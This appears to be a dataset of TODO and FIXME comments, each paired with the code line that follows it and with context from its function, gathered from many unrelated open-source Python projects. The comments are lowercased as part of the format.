raise notimplementederror # the below does most probably not work anymore todo </s> base = none	diff TESTS:: TODO if base == "dependencies": branch = self.git.current_branch()
# todo assert exit code != 0 </s> self.assertequal(dvol.voluminous.getoutput(),	test_create_volume_already_exists try: dvol.parseOptions(ARGS + ["-p", self.tmpdir.path, "init", "foo"]) ["Error: volume foo already exists"]) except VolumeAlreadyExists:
# todo: add logging </s> pass	parse_intent def parse_intent(self, token='ri', params='n'):
# todo: create/clear alarm_data folder </s> logging.info("received action from manager")	got_action def got_action(self, ch, method, properties, body): if(self.active): threads = [] for act in self.actors:
# todo is this redundant now we have --dumptab? </s> def dump_all_files(report):	dump_all_files include_dirs = 1 prog_dirs = []
# todo: add option for attentive reader </s> print('trainable variables (only embeddings): %d' % get_total_trainable_variables())	conditional_reader_model varscope.reuse_variables() support_embedded = nvocab(support) outputs, states = conditional_reader(support_embedded, support_lengths, question_embedded, question_lengths,
# todo: remove? </s> const.requisitionactions.fulfill	process_transfers if transfers[0].action in [ const.StockActions.RECEIPTS, ]: here, there = ('dest', 'src')
raise notimplementederror  # todo... </s> def _collect_single_seq(self, seq_idx):	_collect_single_seq
#todo: calculate _net_workarea for the monitor represented by </s> clipbox = usablearea.get_clipbox()	cmd_moveCenter if not usableArea: return None dims = (int((clipBox.width - winGeom.width) / 2), int((clipBox.height - winGeom.height) / 2),
remote.fetch()  ### todo: show progress </s> print(" done.")	_fetch_remote def _fetch_remote(remote): print(INDENT2, "Fetching", remote.name, end="...")
# todo: the one_hot=true is only necessary because one_hot=false is </s> trainset = mnist(which_set='train', one_hot=true)	test_ais Russ's code's output for the same parameters. try: testset = MNIST(which_set='test', one_hot=True) except NoDataPathError:
# todo : the section permission here should be ql_x86_a_priv_3, but i do n’t know why it can only be set to ql_x86_a_priv_0. </s> ql.gdtm.register_gdt_segment(5, 0, 0xfffff000, ql_x86_a_present | ql_x86_a_data | ql_x86_a_data_writable | ql_x86_a_priv_0 | ql_x86_a_dir_con_bit, ql_x86_s_gdt | ql_x86_s_priv_0)	ql_linux_x86_register_ds_ss_es def ql_linux_x86_register_ds_ss_es(ql): ql.register(UC_X86_REG_DS, ql.gdtm.create_selector(5, QL_X86_S_GDT | QL_X86_S_PRIV_0)) ql.register(UC_X86_REG_SS, ql.gdtm.create_selector(5, QL_X86_S_GDT | QL_X86_S_PRIV_0))
# todo: remove when support for django 1.4 is dropped </s> def get_concrete_model(model):	get_concrete_model Prior to django r17573 (django 1.4), `proxy_for_model` returned the actual concrete model of a proxy and there was no `concrete_model`
# todo(vek): need to pass context in for access to auth_token </s> raise notimplementederror()	update_available_resource :param ctxt: security context :param host: hostname that compute manager is currently running
os.chdir(dest_dir)  # todo: error checking </s> return 0	Pushd self.dir_stack.append(os.getcwd()) dest_dir = argv[1]
# todo: verify that we need this for-loop </s> for key in kwds:	write_yaml ostream = sys.stdout option = copy.copy(SolverResults.default_print_options) setattr(option,key,kwds[key]) repn = self._repn_(option)
# todo: remove </s> import pdb; pdb.set_trace()	error_handler if self.debug_error:
# todo check the op returned a view </s> if dmap and idx in dmap:	count_running_memory vmap = getattr(node.op, 'view_map', None) for idx, v in enumerate(val): node_memory_saved_by_inplace += v elif vmap and idx in vmap:
# todo(mierdin) will parameters always be here? fix this and the heinous thing below </s> schema = raw_inquiry["parameters"].get(	_transform_inquiry if not raw_inquiry.get("parent"): return None "schema", raw_inquiry["runner"]["runner_parameters"]["schema"]["default"]
# todo: do we need to skip config.add_slack variable here? </s> var_filter = (lambda v: v[1].is_integer()) if discrete_only \	generate_norm2sq_objective_function discrete_only: Bool only optimize on distance between the discrete variables else (lambda v: v[1].name != 'MindtPy_utils.objective_value' and 'MindtPy_utils.MindtPy_feas.slack_var' not in v[1].name)
# todo: allow iteration over regionfile self. (thus: for chunk in regionfile('region.mcr'): ... ) </s> index = 0	get_chunk_coords Return the x,z coordinates and length of the chunks that are defined in te regionfile. This includes chunks which may not be readable for whatever reason. self.file.seek(index) chunks = []
# todo: test more stuff! </s> assert output.shape == (3, 2, 128, 128)	test_forward_through_model self.data, roi, axistags)
# todo find out what's wrong </s> warnings.warn(	__init__ ] elif index == 'X': 'Stroud-Secrest\'s scheme X for E_3^r has degree 3, not 7.' )
# todo: use dataopdict/tuple's new `map` method. </s> env_actions = [tuple(value[i] for _, value in enumerate(actions)) for i in range(len(actions[0]))]	_execute "ERROR: Cannot flip tuple-action batch if returned value is not a tuple OR " \ "values of returned value are not np.ndarrays!" else: env_actions = actions
# todo: rewrite tests </s> pass	test_resend_confirmation_get def test_resend_confirmation_get(self):
# todo(brett.cannon) implement </s> pass	test_path_importer_cache_has_None def test_path_importer_cache_has_None(self):
# todo(rosmaita): bug #1745003 </s> self.assertequal('public_id', rows[2]['id'])	TestOcataMigrate01Mixin self.assertEqual('private_id_1', rows[0]['id']) self.assertEqual('private_id_2', rows[1]['id']) self.assertEqual('shared_id', rows[3]['id'])
# todo: detect other runtimes </s> else:	do_deploy if exists(join(app_path, 'requirements.txt')): deploy_python(app) echo("Error: app '%s' not found." % app, fg='red')
# todo: change to deprecationwarning in version 1.1 </s> warnings.warn(	_warn_first_match def _warn_first_match(): "Use best_match instead", PendingDeprecationWarning,
# todo: replace with specific error when exceptions are refactored </s> raise xlwings.xlwingserror("getting or setting 'app.interactive' isn't supported on macos.")	App @property def interactive(self): @interactive.setter def interactive(self, value):
# todo: merge with config_check_pre_system_cron </s> return redirect('/admin/django_q/schedule/add/?name=system_importer_file_csv&func=dfirtrack_main.importer.file.csv.system_cron')	config_check_pre_system_cron else:
# due to exponentiation being involved there is some fp error. todo: arrange to be able to assert the range, or duplicate the computation, instead of using exact constants </s> self.__check_parsed(	test_compressed_position_example_1 def test_compressed_position_example_1(self): 'FOO>BAR:!/5L!!<*e7>7P[', facts=[
# todo(b/163904067): mimic defun' behavior and reset the step seed to </s> resetstepseed()	WhileLoop @tf.function(autograph=False) def LoopCond(*args): s = state.Pack(args) return cond(s.loop_state)
# todo(eric_k): unicorn@1.0.2rc1 doesn't like writing to </s> self.registers -= {"fs"}	__init__ self.registers = set(self._cpu.canonical_registers) self.registers -= self.flag_registers self.registers.add("EFLAGS") for reg in self.registers:
# todo: where to store config? </s> db = mysqldb.connect(	ingest_upload_atk_get_resource_component_and_children def ingest_upload_atk_get_resource_component_and_children(resource_id, resource_type='collection'): resource_data = {}; host="localhost", user="root",
# todo: refactor accordingly when v3 websocket api is released </s> output["results"].update({	BittrexAPIOrderBookDataSource if _is_snapshot(msg): output["results"] = _decode_message(msg["R"]) "M": f"{output['results']['M'].split('-')[1]}-{output['results']['M'].split('-')[0]}" })
# todo: if we're going to implement ttl, it will be here. </s> self._ursulas[ursula_interface_id] = ursula.as_discovered_on_network(port=port, interface=interface,	follow_treasure_map signature, ursula_pubkey_sig, hrac, (port, interface, ttl) = dht_value_splitter(value.lstrip(b"uaddr"), msgpack_remainder=True) pubkey_sig_bytes=ursula_pubkey_sig)
#todo fixme: this is a very crude way of dupe checking </s> else:	procesPage if claim.getID() in item.get().get('claims'): pywikibot.output(u'A claim for %s already exists. Skipping' % (claim.getID(),)) match = re.search(pywikibot.link_regex, value) if match:
# todo: replace with a getter </s> die(self.invalid_json_msg)	check_multiline_json die(self.invalid_json_msg_single_quotes) else: print('%s (multi-record format)' % self.valid_json_msg) return True
#  todo: test </s> skill="industrial command ships"	handler src.getModifiedItemAttr("shipBonusICS4"),
# todo: union types don't work with scalar types </s> graphql_type = graphqluniontype(field_name, [type.field for type in types])	get_graphql_type_for_annotation else: is_optional = type(None) in types else: graphql_type = TYPE_MAP.get(annotation)
# todo(releasesv2): add health data </s> self.browser.snapshot("organization releases v2 - with releases")	test_list self.browser.wait_until_not(".loading")
# todo: what happens to sysex messges here? </s> if len(self._bytes) == self._typeinfo.size:	put_byte pass if self._inmsg: opcode = self._bytes[0] data = self._bytes[1:]
# todo: speedup by allocating the denominator directly instead of constructing it by sum </s> return tf.slice(tens, [0, 0, second * single_batch_size], [m, n, single_batch_size])	half n = int(n)
# todo: revert this. </s> from astropy.tests.helper import quantity_allclose	HeliographicStonyhurst _default_wrap_angle = 180*u.deg def __init__(self, *args, **kwargs): _rep_kwarg = kwargs.get('representation', None) wrap = kwargs.pop('wrap_longitude', True)
# todo: test pdb files with dna and rna too: </s> record.annotations["molecule_type"] = "protein"	AtomIterator record_id = "%s:%s" % (pdb_id, chn_id) record = SeqRecord(Seq("".join(res_out)), id=record_id, description=record_id) record.annotations["model"] = model.id record.annotations["chain"] = chain.id
# todo: document </s> if self._phkey is not none:	exists @property def exists(self): return True try:
annot.annotation_metadata.validation_and_reliability = "todo" #todo </s> annot.annotation_metadata.origin = "epiphyte corp"	fill_annoatation_metadata annot.annotation_metadata.annotation_tools = "Sonic Visualizer" annot.annotation_metadata.annotation_rules = "TODO" #TODO annot.annotation_metadata.annotator.name = "TODO" annot.annotation_metadata.annotator.email = "TODO" #TODO
# todo share code with check_argument_count in checkexpr.py? </s> if len(call.args) < 2:	check_namedtuple error_classdef = ClassDef('namedtuple', Block([])) error_typeinfo = TypeInfo(SymbolTable(), error_classdef) self.fail("Too few arguments for namedtuple()", call) return error_typeinfo
# todo fix. </s> self.assertequals(reil_ctx_out["xmm0"], res)	test_pcmpeqb res = 0x000000ff0000ff00ff00000000ffff00 x86_ctx_out, reil_ctx_out = self.__run_code(asm, 0xdeadbeef, ctx_init) self.assertEquals(reil_ctx_out["xmm1"], ctx_init["xmm1"])
if np.any(coulomb_log):  # todo: something </s> clog = coulomb_logarithm(t_e,	fundamental_electron_collision_freq ) coeff = 4 / np.sqrt(np.pi) / 3 n_e, particles,
# todo change when v4 web3.py will released </s> dht_keys = tuple(self.escrow().getminerid(self.address, index).encode('latin-1') for index in range(count))	get_dht_key def get_dht_key(self) -> tuple: count = self.escrow().getMinerIdsCount(self.address) return dht_keys
# todo: comment in visit_print also applies here </s> return self.visit(ast27.call(	visit_Repr @with_line def visit_Repr(self, n: ast27.Repr) -> Node: ast27.Name("repr", ast27.Load(), lineno=n.lineno, col_offset=-1), n.value,
# todo: handle multiple skip stacks </s> (skip, skip_stack), = skip_stack.items()	block_container_layout first_letter_style = getattr(box, 'first_letter_style', None) else: first_letter_style = None for index, child in enumerate(box.children[skip:], start=(skip or 0)):
# todo clarify api - this should be pretty limited to support mainly confirming </s> return confirm_blob(	confirm_address icon_color: int = ui.GREEN,  # TODO cleanup @ redesign ) -> Awaitable[None]: ctx, br_type=br_type,
# todo remove </s> continue	get_posibilities if compare.base in [t.base for t in types if hasattr(t, 'base')]: evaluator.eval_trailer(types, trailer) calls = helpers.scan_statement_for_calls(stmt, func_name) for c in calls:
raise skiptest("buggy")  # todo(mattjj): fix </s> p = onp.arange(15).reshape((5, 3)) % 4 == 1	testSelect def testSelect(self): f = onp.zeros((5, 3)) def fun(t):
elif key_type == unicode:  # todo: change to 'str' on python3 </s> field_index = self.field_names.index(key)	Table elif key_type == slice: return [self.Row(*row) for row in self._rows[key]] return [row[field_index] for row in self._rows] else:
#todo: create a failed test if a dependency didn't install? </s> continue	create_test_output if not all(spack.db.get(childSpec).installed for childSpec in spec.dependencies.itervalues()): bId = BuildId(spec.name, spec.version, spec.dag_hash()) package = spack.db.get(spec)
# todo(zchee): configurable and refactoring </s> if c.type == 'function':	gather_candidates for c in completions: word = c.name word += '(' elif (word == 'self' or
# todo: when sharing moves into the store this should be replaced </s> lock = (yield self._createlock(userid, request))	uninviteSingleUserFromShare @inlineCallbacks def uninviteSingleUserFromShare(self, userid, aces, request): yield self._acquireLock(lock) try:
# todo: systemhistory_user_id </s> )	save systemhistory_old_value = self.previous_analysisstatus.analysisstatus_name, systemhistory_new_value = self.analysisstatus.analysisstatus_name, systemhistory.save() self.previous_analysisstatus = self.analysisstatus
# todo(developer): uncomment and set the following variables </s> parent = client.location_path(project_id, location_id)	create_scheduler_job from google.cloud import scheduler client = scheduler.CloudSchedulerClient() job = { 'app_engine_http_target': {
:class:`goless.channelclosed` will be raised. (#todo) </s> if self._closed:	send :class:`goless.ChannelClosed` will be raised. If the channel closes during a blocking ``send``, raise ChannelClosed() self._send(value)
# todo debug </s> print ("sensor rule element with "	_evaluateRuleElementsRecursively + "triggered. Set 'and' rule " + "also to not triggered.") + "remote id '%d' and username '%s' not " % (element.element.remoteSensorId,
# todo(jeremydw): thread pool. </s> threads = []	create_fileset resp = self.rpc('filesets.sign_requests', sign_requests_request) print 'Retrieved signed requests.' for req in resp['signed_requests']: file_path = req['path']
# todo(iceboy): check if the user attended the contest. </s> path_components = self.build_path(	ContestDetailProblemHandler tdoc, pdoc = await asyncio.gather(contest.get(self.domain_id, tid), problem.get(self.domain_id, pid, uid)) (self.translate('contest_main'), self.reverse_url('contest_main')), (tdoc['title'], self.reverse_url('contest_detail', tid=tid)),
# todo: union types don't work with scalar types </s> graphql_type = graphqluniontype(field_name, [type.field for type in types])	get_graphql_type_for_annotation else: is_optional = type(None) in types else: graphql_type = TYPE_MAP.get(annotation)
# todo: implement meaningful test </s> self.core.teardown()	test_export_state def test_export_state(self):
# todo: use closest instead of conditioning on single entry </s> if len(lineswithsameurir) == 1:	show_uri print('CDXJ lines with URI-R at {0}'.format(path)) print(linesWithSameURIR) fields = linesWithSameURIR[0].split(' ', 2) redirectURI = '/{1}/{0}'.format(unsurt(fields[0]), fields[1])
# todo: include urls explicitly in desc format </s> childdescs[key] = cell.description()	__describe_block } for key, cell in block.state().iteritems(): return description
# todo: refactor </s> if mode is none:	DenseDesignMatrix def iterator(self, mode=None, batch_size=None, num_batches=None, topo=None, targets=None, rng=None): if hasattr(self, '_iter_subset_class'): mode = self._iter_subset_class
# todo isolate this test </s> for name in ['language', 'lc_all', 'lc_ctype', 'lc_messages']:	test_default_locale def test_default_locale(): os.environ[name] = '' os.environ['LANG'] = 'fr_FR.UTF-8'
# todo: provide a kernel which will describe how coordinates are extruded. </s> mesh = firedrake.extrudedmesh(m, layers, layer_height=0.1)	integrate_assemble_p0 m = UnitSquareMesh(2 ** power, 2 ** power) layers = 11 fs = firedrake.FunctionSpace(mesh, family, degree, name="fs") f = firedrake.Function(fs)
# todo: send finished </s> def got_config(self, ch, method, properties, body):	Worker for t in threads: t.join() print " [x] Received config %r" % (body,) f = open('config.json','w')
tol = 0.15  # todo(skye): can we be more precise? </s> jtu.check_grads(np_fn, args_maker(), order=1, atol=tol, rtol=tol)	testFft self._CompileAndCheck(np_fn, args_maker, check_dtypes=True) if dtype in inexact_dtypes: jtu.check_grads(np_fn, args_maker(), order=2, atol=tol, rtol=tol)
# todo: fixme for photos 4 </s> if self._db._db_version < _photos_5_version:	path_live_photo If photo is missing, returns None """ photopath = None photopath = None else:
# todo make "master" not hard-coded, fetch it from some metadata </s> branchname = default_branch	commitVolume self.output(commitId) volume = self._directory.child(volume) branch = volume.child("branches").child(branchName) commit = volume.child("commits").child(commitId)
# todo: extend to inputs with shape (n_samples, 1) </s> cover = onedimensionalcover(n_intervals=n_intervals)	test_one_dimensional_cover_shape ) def test_one_dimensional_cover_shape(filter_values, n_intervals): n_samples, n_intervals = len(filter_values), cover.n_intervals try:
#todo: this loop is pretty slow .. (parellize) </s> for iky in range(self.nky):	Jtvec Jtv_temp1 = np.zeros(m.size) Jtv_temp0 = np.zeros(m.size) u_src = f[src, self._solutionType, iky] ky = self.kys[iky]
# todo move to common? </s> def dir_hash(path: path):	dir_hash mtimes = tuple(p.stat().st_mtime for p in sorted(path.glob('*.json'))) return mtimes
# todo: give a vanilla example </s> .. math::	hamming_loss def hamming_loss(predicted_state, ground_truth_state): HammingLoss^{(n)} = \\frac{1}{T} \\sum_{t}
time.sleep(1)  # delay, for last.fm latency. todo can this be removed later? </s> loved = lastfm_user.get_loved_tracks(limit=1)	test_love lastfm_user = self.network.get_user(self.username) track.love() self.assertEqual(str(loved[0].track.artist).lower(), "test artist") self.assertEqual(str(loved[0].track.title).lower(), "test title")
# todo(mordred) when this changes to rest, force interface=admin </s> if self.cloud_config.get_api_version('identity') != '3':	update_user user = self.get_user(name_or_id) kwargs['user'] = self.get_user_by_id(user['id'], normalize=False) kwargs.pop('domain_id', None) kwargs.pop('description', None)
# todo: remove this when we depend on genshi >= 0.5 </s> return stream.render('text')	render_template if method == 'text': if arity(stream.render) == 3: else: buffer = cStringIO()
# todo: test without file </s> def test_impl():	test_nunique_parallel def test_nunique_parallel(self): df = pq.read_table('example.parquet').to_pandas() return df.four.nunique()
# todo: make this configurable </s> count = 100	get_authentication_item ret = {} if token_type.lower() == "hotp": toks = get_tokens(serial=serial) if len(toks) == 1:
# todo(harlowja): the bug 1214083 is causing problems </s> log.debug(_("%(flow)s has moved into state %(state)s from state"	flow_log_change def flow_log_change(state, details): " %(old_state)s") % {'state': state, 'old_state': details.get('old_state'),
# todo: distinguish between text elements with actual whitespace </s> content = body_children[1].get_text(' ', strip=true)	m_html_timeline_to_objects story_body_container = story.find(class_='story_body_container') body_children = cls._divs(story_body_container) footer = story_body_container.find_next_sibling('div') footer_children = cls._divs(footer)
# todo: require tests </s> def ea_jac_t_mat_jac_prod(self, module, g_inp, g_out, mat):	ea_jac_t_mat_jac_prod _, in_c, in_x, in_y = module.input0.size() in_features = in_c * in_x * in_y
# todo remove comment parameter. </s> if isinstance(constraint, bool):	Z3Solver return declarations def add(self, constraint, comment=None): if not constraint: self._status = 'unsat'
#todo need to hook up any inputs here </s> kargs["embed"] = steps[util.pythonise(module['conf']['embed']['value']['id'])]	build_pipe kargs["%(id)s" % {'id':util.pythonise(pipe['wires'][wire]['tgt']['id'])}] = steps[util.pythonise(pipe['wires'][wire]['src']['moduleid'])] if module['type'] == 'loop': pymodule_name = "pipe%(module_type)s" % {'module_type':module['type']} pymodule_generator_name = "pipe_%(module_type)s" % {'module_type':module['type']}
# todo(b/155239129): used list_physical_device in `setup` for gpu tests. </s> comp_proto, comp.type_signature, device='/there_is_no_such_device')	test_embed_tensorflow_computation_fails_with_bogus_device eager_tf_executor.embed_tensorflow_computation(
# todo: it seems that yahoo! converts relative links to </s> request = urllib2.request(url)	pipe_xpathfetchpage url = util.get_value(DotDict(item_url), DotDict(item), **kwargs) try: request.add_header('User-Agent','Yahoo Pipes 1.0') request = urllib2.build_opener().open(request)
# todo watch out because urllib.unquote will blow up on unicode text </s> session_id, text = map(urllib.unquote_plus, (session_id, text))	do_GET else: target = self.server.backend msg = target.message(session_id, text) target.route(msg)
# todo add binary column (after dropping support for python 2.7) </s> df = pd.dataframe({	test_generate_ddl def test_generate_ddl(self): 'col_int': np.int32([1]), 'col_bigint': np.int64([12345]),
self.assertequals(status, 200) # todo: should be 202 </s> status, body = self.post(path, body)	test_uninstall options=options,)
# todo. check if build_url_fname can be used. </s> newpath = "/".join(['..']*3 + [newpath])	draw_box self.report.add_lnkref_to_photo(photo, lnkref) newpath = copy_thumbnail(self.report, photo_handle, photo, region) if constfunc.win(): newpath = newpath.replace('\\',"/")
raise notimplementederror #todo, implement! </s> def testclass(cls):	testclass
# todo: deprecate `pages` in favor of `page_limit` since it is less confusing </s> if 'pages' in kwargs:	get_posts raise ValueError("You need to specify either account or group") _scraper.requests_kwargs['timeout'] = kwargs.pop('timeout', DEFAULT_REQUESTS_TIMEOUT) kwargs['page_limit'] = kwargs.pop('pages') if credentials is not None:
# todo: arrange </s> systems = self.remote.get_systems(self.token)	test_create_system def test_create_system(self): Test: create/edit a system object system = self.remote.new_system(self.token) self.assertTrue(self.remote.modify_system(system, "name", "testsystem0", self.token))
# todo: os.path doesn't make sense here as it's os-dependent </s> tmp_dir = os.path.dirname(slashless_path)	__init__ num, self.target._trailing_slash()) self.target.fs.mkdir(tmp_dir, parents=True, raise_if_exists=False)
common_path=prefix,  # todo: add key? </s> action="local",	make_inline_attachments_decision ld = local_diff[k] md = MergeDecision( conflict=False, local_diff=[ld],
# xxx todo register a failure handler that reverses the local state </s> return "ok"	delete q = action.get_queue() q.enqueue(action.get_delete_fn(account), thread_id, folder_name)
# todo: console auth doesn't have support for handling unknown providers </s> if provider == 'unknown':	handler_from_provider def handler_from_provider(provider): provider = 'eas' auth_mod = module_registry.get(provider)
#todo same issue with batch_size </s> if len(self.inputs) == 0:	height def height(self): raise ValidationException("gan.height() requested but no inputs provided") return self.ops.shape(self.inputs[0])[1]
# todo add locales </s> raise yunohosterror("bad_value_type", value_type=type(ttl))	domain_set_settings ttl = int(ttl) except: if ttl < 0: raise YunohostError("must_be_positive", value_type=type(ttl))
# todo: tokenize attribute strings properly </s> attr_string = attr_string.replace(';\"', '\"').replace(";-", "-")	_extend_with_attributes column_order = [] for i, attr_string in enumerate(df.attribute): pairs = ( kv.strip().split(" ", 2)
#todo - cookies? </s> curl_cmd = 'curl -l '	curl @property def curl(self): header = '' if self.headers:
# => todo: allow for passing a branch </s> cmd_list.append(repo.git_get_active_branch())	__call__ if name: cmd_list.append(name) out, err = repo._git_custom_command('', cmd_list) lgr.info(out)
# todo: this wait=false can be problematic! </s> node.cmd(args, wait=false)	bootnodecustomservice return for args in service._startup:
# todo: may test with codecs.open passing an encoding </s> with open(self.filename) as fobj:	test_import_from_csv_fobj def test_import_from_csv_fobj(self): table = rows.import_from_csv(fobj, encoding=self.encoding) self.assert_expected_table(table)
# todo: arrange </s> result = self.remote.find_system({"name": "testsystem0"}, self.token)	test_find_system def test_find_system(self): Test: find a system object self.assertTrue(result) assert 0
# todo: see get_scale_factor() to choose 72 px on hidpi </s> return getattr(self.row.icon._impl, "native_" + str(32))	get_icon def get_icon(self, row): row.icon.bind(self.interface.factory)
rec_dict._proxy._handle.close() #todo - better solution </s> del rec_dict	get_raw_check rec2 = SeqIO.read(handle, format, alphabet) self.assertEqual(True, compare_record(rec1, rec2))
# todo add support for more diverse obs_spec and action_spec </s> args:	torch_aggregate def torch_aggregate(exp_list, obs_spec, action_spec): exp_list: obs_spec:
# todo: passing a broker client around isn't thread-safe </s> kwargs = {'broker_client':self.broker_client}	_after_init_common self.singleton_server.pickup.pickup_event_processor.pickup_dir = pickup_dir self.singleton_server.pickup.pickup_event_processor.server = self.singleton_server Thread(target=self.singleton_server.run, kwargs=kwargs).start() self.singleton_server.scheduler.wait_for_init()
#todo: allow a,c,m recovery for unknown values </s> if any([x=='unknown' for x in [a,c,m]]):	lcg_next_states c - (int) The addend for the LCG. m - (int) The modulus for the LCG. print 'a,c,m recovery not yet implemented.' return False
# todo: attributes should be freed </s> attr = pango.pango_attr_letter_spacing_new(spacing)	add_attr def add_attr(start, end, spacing): attr.start_index, attr.end_index = start, end pango.pango_attr_list_insert(attr_list, attr)
# todo: remove seaborn dependencies </s> ax = sns.heatmap(df)	pcolor Z = np.concatenate((z.values, np.zeros(diff))).reshape(shape) df = pd.DataFrame(Z, index=y.unique(), columns=x.unique()) pl.title(title) pl.xlabel(xname)
# todo: replace </s> tuples = np.repeat(a=tuple, repeats=all_entities.shape[0], axis=0)	_compute_metrics tuple = np.reshape(a=triples[row_nmbr, start_of_columns_to_maintain:end_of_columns_to_maintain], newshape=(1, 2)) corrupted = concatenate_fct(candidate_entities=all_entities, tuples=tuples) corrupted = torch.tensor(corrupted, dtype=torch.long, device=device)
# todo: investigate why this fails </s> return	test_field_renaming def test_field_renaming(self): value = self.field_values[0] Model = self.model_def.model_class()
recording_uuid = none #todo </s> start_time_system_ns = none  # todo	recording_update_pupil_invisible_to_pprf_2_0 info_csv = utils.read_info_csv_file(rec_dir) info_json = utils.read_info_json_file(rec_dir) start_time_synced_ns = None  # TODO duration_ns = None  # TODO
# todo: remove dependency on legacy_examples </s> cli_args_to_test = [	test_build_dags and that Airflow is able to successfully parse our DAGs. runner = CliRunner() ['--module-name', 'dagster_examples.toys.log_spew', '--pipeline-name', 'log_spew'], ['--module-name', 'dagster_examples.toys.many_events', '--pipeline-name', 'many_events'],
#todo: remove expressions </s> firstnote.duration.quarterlength = self.quarterlength	Trill for i in range(numberOfTrillNotes): firstNote = copy.deepcopy(srcObject) secondNote = copy.deepcopy(srcObject) secondNote.duration.quarterLength = self.quarterLength
# todo: this type conversion seems to be bottle neck </s> features = tf.divide(tf.cast(inputs, tf.float32),	call def call(self, inputs): tf.constant(255.)) features = self.conv1(features)
# todo: raise unrecognized operator error </s> print("unrecognized operator: " + op_type)	create_neon_op op = be.Variable(axes=(ax.Y,), name=node.name) else: return op
# todo: remove? </s> elif tx.action == const.requisitionactions.fulfill:	process_transactions ): balances.append(tx) balances.append(tx) transfers.append(tx)
# todo: extend </s> scores = logits = tf.reduce_sum(tf.mul(tf.expand_dims(output, 1), candidates_embedded), 2)	conditional_reader_model_with_cands options["repr_dim_output"]/2)   #making output half as big so that it matches with candidates output = tf.concat(1, [states[0][1], states[1][1]]) loss = tf.nn.softmax_cross_entropy_with_logits(scores, targets) predict = tf.arg_max(tf.nn.softmax(logits), 1)
# todo: uncomment these, when #1217 is fixed </s> link = link('http:/yo/pytest_xdist-1.0-py2.py3-none-any.whl')	test_link_package_versions_substring_fails def test_link_package_versions_substring_fails(self): result = self.finder._link_package_versions(link, self.search_name)
# todo(ytknzw): add more specific assertion with the test case. </s> assert figure.has_data() is true	test_plot_contour assert figure.has_data() is True else:
# todo: remove this after we create the contents web service and directories are </s> def notebooks_only(nb_list):	notebooks_only return [nb for nb in nb_list if 'type' not in nb]
# todo: os.path.expandvars, os.path.expanduser? is not needed here, isn't it? always? </s> ds.get(expanded_list)	__call__ for item in path: expanded_list.extend(glob.glob(item))
# todo: check syntax </s> values = [v.lower() for v in values]	vary @GenericHeaderSyntax def vary(self, name, values): values.sort() if "*" in values:
# todo: should this result be 0 instead of nan? </s> result = data.compute_statistic('sum', data.id['x'], subset_state=subset_state,	test_compute_statistic_efficient assert_allclose(result, 3840) assert data.elements_accessed == 3520 view=[slice(0, 3)]) assert_allclose(result, np.nan)
# todo: if update_atlas: introduce charts via self._atlas </s> return self._total_space	total_space diff_degree=self._diff_degree, start_index=sindex)
# todo: we're reading the config file twice. </s> config.read_file(io.open(config_file, "rt", encoding="utf-8"))	main logger.info(io.open(config_file, "rt", encoding="utf-8").read()) try: except AttributeError: config.readfp(io.open(config_file, "rt", encoding="utf-8"))
# todo(amotoki): due to neutron bug 1378525, neutron disables </s> self.ha_allowed = false	__init__ ('distributed', _('Distributed'))] self.fields['mode'].choices = mode_choices if not self.ha_allowed: del self.fields['ha']
# xxx todo register a failure handler that reverses the local state </s> return "ok"	move q = action.get_queue() q.enqueue(action.get_move_fn(account), thread_id, from_folder, to_folder)
# todo: replace `funcname` with func.__name__? </s> errmsg = ("v must be a quantity with units of velocity in"	_check_relativistic >>> from astropy import units as u >>> _check_relativistic(1*u.m/u.s, 'function_calling_this') "_check_relativistic") if not isinstance(V, u.Quantity):
# todo: remove debug statements after fixing in-toto/in-toto#171 </s> log.debug("{0} (stdout):{1}".format(command, process.stdout))	gpg_export_pubkey process = in_toto.process.run(command, stdout=in_toto.process.PIPE, stderr=in_toto.process.PIPE) log.debug("{0} (stderr):{1}".format(command, process.stderr)) key_packet = process.stdout
# todo: work out a way to set this based on the timespan of the data. </s> locator = mdates.autodatelocator(minticks=5, maxticks=25)	plot ax.legend(loc="upper right") axes[-1].set_xlim(self.to_dataframe().index[0], self.to_dataframe().index[-1]) formatter = mdates.ConciseDateFormatter(locator) axes[-1].xaxis.set_major_locator(locator)
except exception as error:  # todo: be specific </s> self.bot.error(exception=error)	run except KeyboardInterrupt: raise time.sleep(10.0)  # seconds
# todo: try mlp rather than bilinear </s> self.logits_second_real = tf.transpose(bilinear(emb_first_real, emb_node, name='logits_second'), [0, 2, 1])	_init emb_second = tf.boolean_mask(emb_node, mask) emb_second = tf.expand_dims(emb_second, axis=1) self.logits_second_real = tf.squeeze(self.logits_second_real, axis=-1) ac_first_mask_real = tf.one_hot(ac_first_real, depth=tf.shape(emb_node)[1], dtype=tf.bool, on_value=False, off_value=True)
# todo: score is the negative of the distance </s> score = - torch.sum(torch.abs(h_embs + r_embs - t_embs))	compute_score :param t_embs: :return: return score
return # todo </s> for decorator_expr in node.nodes:	leave_decorators def leave_decorators(self, node): # XXX parent visit a Decorator node -> check for classmethod and staticmethod if isinstance(decorator_expr, nodes.Name) and \ decorator_expr.name in ('classmethod', 'staticmethod'):
# todo(lbragstad): sleeping after the response status has been checked </s> time.sleep(1)	test_update_user_password self.client.update_user_password(user['id'], new_password, original_password) resp = self.token.auth(user_id=user['id'], password=new_password).response
except exception:   # todo </s> potential_index = 0	get_potentials potential_index = potential['potential_index'] + 1 block_index = potential['block_index'] + 1 block_index = config.BLOCK_FIRST block_count = bitcoin.rpc('getblockcount', [])
pass  # todo: 实盘需要检查 </s> def check_pending_order(self):	check_pending_order
field = column.field.replace('#', '') # todo: is this line needed? </s> return u"m{module.id}.{detail_type}.{d.model}_{field}_{d_id}.graph.a.{a_id}".format(	graph_annotation @pattern('m%d.%s.%s_%s_%s.graph.a.%d') def graph_annotation(module, detail_type, column, annotation_index): module=module, detail_type=detail_type,
# todo: better default date format </s> n = len(self.appliances) + len(self.mains)	_plot_missing_sample_using_rectanges def _plot_missing_sample_using_rectanges(self, ax=None, fig=None): colours = [plt.cm.Blues(c) for c in np.linspace(0.3, 0.9, n)] ylabels = []
# todo: look this up in one query </s> for user_id in collaborator_ids:	create collaborator_ids = collaborator_ids.get(playlist.id, []) collaborators = [] user = db_user.get(user_id) if user:
# todo add typeerror if params are given. </s> return self._generator.iter_content()	py__call__ def py__call__(self, params):
# todo: add logging in case the post fails. </s> def pass_test(agent_id, win_percent):	pass_test request_url = os.getenv('PLAYGROUND_SERVER_URL' + '/fail_test') requests.post(request_url, json={
# todo: add option to only show error runs </s> return {	get_all @nav.active_section('runs') def get_all(self): 'runs': request.db.get_runs(sort_order='DESC'),
